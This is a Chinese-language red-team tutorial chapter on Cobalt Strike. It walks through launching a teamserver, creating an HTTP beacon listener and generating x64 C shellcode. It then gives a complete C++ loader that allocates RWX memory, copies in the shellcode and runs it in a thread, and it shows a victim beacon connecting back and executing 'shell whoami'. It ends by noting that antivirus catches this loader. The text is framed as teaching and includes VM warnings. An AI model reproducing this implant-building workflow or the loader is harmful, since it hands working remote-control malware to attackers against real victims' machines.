<p>现在，我们要把这个“弹窗”换成真正的红队核心功能——<strong>远程控制</strong>。</p>
<p>我们将介绍红队圈子里无人不知的“神器”：<strong>Cobalt Strike (简称 CS)</strong>。</p>
<hr>
<h3 id="严重警告保命须知-必读" class="toc-header"><a class="toc-anchor" href="#严重警告保命须知-必读">¶</a> 🚨 严重警告：保命须知 (必读)</h3>
<p>在开始之前，请务必再次阅读以下三条铁律，这关乎你的个人安全：</p>
<ol>
<li><strong>必须在虚拟机中运行：</strong> Cobalt Strike 是收费商业软件，市面上流传的“破解版”、“汉化版” <strong>99% 都被黑客植入了后门</strong>。如果你在宿主机上运行它，你的所有密码和文件可能瞬间失窃。请务必在 <strong>断网的虚拟机</strong> 中运行服务端。</li>
<li><strong>切勿用于实战：</strong> 原版 Cobalt Strike 的流量特征极其明显，全网的安全设备都认识它。在没有进行复杂的二次开发（魔改）之前，直接拿去攻击有防护的目标等同于“自投罗网”。</li>
<li><strong>仅用于教学：</strong> 我们使用 CS 是因为它界面友好、功能强大，是学习 C2 逻辑的最佳教材。</li>
</ol>
<hr>
<h3 id="h-1-什么是-cobalt-strike" class="toc-header"><a class="toc-anchor" href="#h-1-什么是-cobalt-strike">¶</a> 1. 什么是 Cobalt Strike？</h3>
<p>Cobalt Strike 是一个为红队行动设计的 <strong>C2 (Command and Control) 框架</strong>。</p>
<ul>
<li><strong>Teamserver (服务端)：</strong> 运行在 Linux 上，负责管理所有“僵尸”机器，是团队的大脑。</li>
<li><strong>Client (客户端)：</strong> 运行在 Windows/Mac/Linux 上，提供图形化界面，供你操作。</li>
<li><strong>Beacon (信标)：</strong> 运行在受害者内存中的植入物（Implant）。它不像传统木马那样一直连着服务器，而是像心跳一样，每隔一段时间“醒来”问一下服务器：“老大，有新任务吗？”</li>
</ul>
<h3 id="h-2-启动你的-teamserver" class="toc-header"><a class="toc-anchor" href="#h-2-启动你的-teamserver">¶</a> 2. 启动你的 Teamserver</h3>
<p>假设你已经在一个安全的、隔离的 Kali Linux 或 Ubuntu 虚拟机中配置好了环境。</p>
<p><strong>启动服务端命令：</strong></p>
<pre class="prismjs line-numbers" v-pre="true"><code class="language-bash"># 语法: ./teamserver &lt;本机的IP地址&gt; &lt;连接密码&gt;
sudo ./teamserver 192.168.x.x 123456
</code></pre>
<p><strong>连接客户端：</strong><br>
在 Windows 虚拟机中运行 <code>cobaltstrike.bat</code> (或在 Linux 下运行 <code>.sh</code>)，输入 IP 和密码，连接成功后你会看到一个黑客风格的仪表盘。</p>
<hr>
<h3 id="h-3-建立监听器-listener" class="toc-header"><a class="toc-anchor" href="#h-3-建立监听器-listener">¶</a> 3. 建立监听器 (Listener)</h3>
<p>要让木马能连回来，我们需要先在服务器上张开“耳朵”。</p>
<ol>
<li>点击菜单栏的 <strong>Cobalt Strike -&gt; Listeners</strong>。</li>
<li>点击下方的 <strong>Add</strong>。</li>
<li><strong>Name:</strong> 随便填，比如 <code>http_listener</code>。</li>
<li><strong>Payload:</strong> 选择 <code>Beacon HTTP</code> (最基础的 HTTP 协议反向连接)。</li>
<li><strong>HTTP Hosts:</strong> 填写你的 Teamserver IP。</li>
<li>点击 <strong>Save</strong>。</li>
</ol>
<p>现在，你的服务器已经准备好接收“心跳”了。</p>
<hr>
<h3 id="h-4-生成-shellcode-制造子弹" class="toc-header"><a class="toc-anchor" href="#h-4-生成-shellcode-制造子弹">¶</a> 4. 生成 Shellcode (制造子弹)</h3>
<p>还记得我们上一章手写的那个 <code>0x33, 0xc9...</code> 数组吗？现在我们不需要手写了，让 CS 帮我们生成一段功能强大的 Shellcode。</p>
<ol>
<li>点击菜单栏 <strong>Attacks -&gt; Packages -&gt; Payload Generator</strong>。</li>
<li><strong>Listener:</strong> 选择刚才创建的 <code>http_listener</code>。</li>
<li><strong>Output:</strong> 选择 <strong>C</strong> (这很重要，因为我们的 Loader 是 C/C++ 写的)。</li>
<li><strong>Architecture:</strong> 勾选 <strong>x64</strong> (现代系统通常用 64 位，<strong>注意：这决定了你后面的 VS 项目也要选 x64</strong>)。</li>
<li>点击 <strong>Generate</strong>，保存为 <code>payload.c</code>。</li>
</ol>
<p>打开这个文件，你会看到熟悉的一幕：</p>
<pre class="prismjs line-numbers" v-pre="true"><code class="language-c">/* length: 892 bytes */
unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00...";
</code></pre>
<p>这就是你的<strong>Shellcode</strong>。它不再是弹窗，而是包含了完整的网络连接和控制逻辑。</p>
<hr>
<h3 id="h-5-实战装填用-loader-加载-cs-shellcode" class="toc-header"><a class="toc-anchor" href="#h-5-实战装填用-loader-加载-cs-shellcode">¶</a> 5. 实战装填：用 Loader 加载 CS Shellcode</h3>
<p>现在，回到我们的 <strong>Visual Studio</strong>。打开上一章编写的 <strong><code>VirtualAlloc</code> 版 Loader</strong>。</p>
<p>我们需要做两个关键修改：</p>
<h4 id="修改一替换-shellcode-数组" class="toc-header"><a class="toc-anchor" href="#修改一替换-shellcode-数组">¶</a> 修改一：替换 Shellcode 数组</h4>
<p>把 <code>payload.c</code> 里生成的那个巨大的字符串数组，整理成逗号分隔的格式（或者直接粘贴进去，根据格式微调），替换掉原本的 MessageBox Shellcode。</p>
<blockquote>
<p><strong>💡 小技巧：</strong> CS 生成的默认是字符串格式 <code>"\xfc\xe8..."</code>。C/C++ 编译器完全支持这种写法，你不需要非得把它改成 <code>{0xfc, 0xe8...}</code> 这种逗号分隔格式，直接粘贴字符串即可。</p>
</blockquote>
<h4 id="修改二调整项目架构" class="toc-header"><a class="toc-anchor" href="#修改二调整项目架构">¶</a> 修改二：调整项目架构</h4>
<p>如果你在 CS 里选了 <strong>x64</strong>，请务必把 VS 顶部的解决方案平台从 <strong>x86</strong> 改为 <strong>x64</strong>！否则程序会直接崩溃。</p>
<p><strong>代码示例 (替换后)：</strong></p>
<pre class="prismjs line-numbers" v-pre="true"><code class="language-cpp">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

// 这里放入 CS 生成的 x64 Shellcode
unsigned char shellcode[] = 
    "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51"
    "\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52"
    // ... (省略几百行) ...
    "\x5e\x2e\x32\x2e\x31\x30\x00"; // 假设这是结尾

int main() {
    printf("[*] 正在申请 RWX 内存...\n");

    // 1. 申请内存
    LPVOID exec_mem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE  // &lt;-- 这是主要的特征点！
    );
    
    if (exec_mem == NULL) {
        printf("[-] 内存分配失败！\n");
        return -1;
    }
    printf("[+] 内存分配成功，地址: 0x%p\n", exec_mem);

    // 2. 复制 Shellcode
    RtlMoveMemory(exec_mem, shellcode, sizeof(shellcode));
    printf("[+] Shellcode 已写入内存\n");

    // 3. 执行代码
    HANDLE hThread = CreateThread(
        NULL, 
        0, 
        (LPTHREAD_START_ROUTINE)exec_mem, 
        NULL, 
        0, 
        NULL
    );
    
    if (hThread == NULL) {
        printf("[-] 线程创建失败！\n");
        return -1;
    }
    printf("[+] 线程已创建，等待弹窗...\n");

    // 等待子线程执行完毕，防止主程序提前退出
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}

</code></pre>
<hr>
<h3 id="h-6-见证时刻beacon-上线" class="toc-header"><a class="toc-anchor" href="#h-6-见证时刻beacon-上线">¶</a> 6. 见证时刻：Beacon 上线</h3>
<ol>
<li>在 Visual Studio 中选择 <strong>Release / x64</strong>，点击 <strong>生成 (Build)</strong>。</li>
<li>将生成的 <code>.exe</code> 文件拷贝到你的<strong>测试虚拟机</strong>中（不要在宿主机运行！）。</li>
<li>双击运行。</li>
</ol>
<p><strong>回到你的 Cobalt Strike 客户端界面：</strong></p>
<p>如果一切顺利，几秒钟后，你会看到界面上出现了一行新的记录，包含目标 IP、用户名、PID 等信息，并且图标在闪烁。</p>
<p><strong>恭喜！你成功上线了一台 Beacon！</strong> 🎉</p>
<p>你现在右键点击这台机器，选择 <code>Interact</code>，在控制台输入 <code>shell whoami</code>，就能看到目标机器返回了当前用户名。</p>
<h3 id="总结" class="toc-header"><a class="toc-anchor" href="#总结">¶</a> 🎯 总结</h3>
<p>你刚刚完成了一次标准的红队开发流程：</p>
<ol>
<li><strong>C2 准备：</strong> 搭建 Cobalt Strike 基础设施。</li>
<li><strong>武器化 (Weaponization)：</strong> 提取 CS 的 Shellcode（核心逻辑）。</li>
<li><strong>载荷开发 (Delivery)：</strong> 使用自定义 Loader（外壳）包裹 Shellcode。</li>
<li><strong>上线：</strong> 和受害主机建立连接。</li>
</ol>
<p><strong>但是，</strong> 如果你现在的 Loader 遇到真正的杀毒软件，依然会被秒杀。因为 <code>VirtualAlloc</code> + <code>RWX</code> + <code>CS原始Shellcode</code> 的特征太明显了。</p>
